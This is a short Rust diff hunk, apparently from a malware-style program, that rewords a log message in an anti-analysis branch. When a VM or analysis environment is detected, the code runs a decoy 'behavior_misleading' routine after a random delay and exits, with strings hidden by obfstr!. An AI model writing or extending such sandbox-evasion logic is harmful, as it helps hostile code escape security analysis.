@@ -86,7 +86,7 @@ fn run() -> Result<(), Box<dyn Error>> {
 
     if ANALYSIS_DETECTION && analysis_detected() {
         if VERBOSE {
-            logger::log_info(obfstr!("VM detected. Exiting..."));
+            logger::log_info(obfstr!("analysis detected. changing behavior..."));
         }
         behavior_misleading(rand::rng().random_range(60..120)); // Random delay between 60 and 120 seconds
         return Ok(());
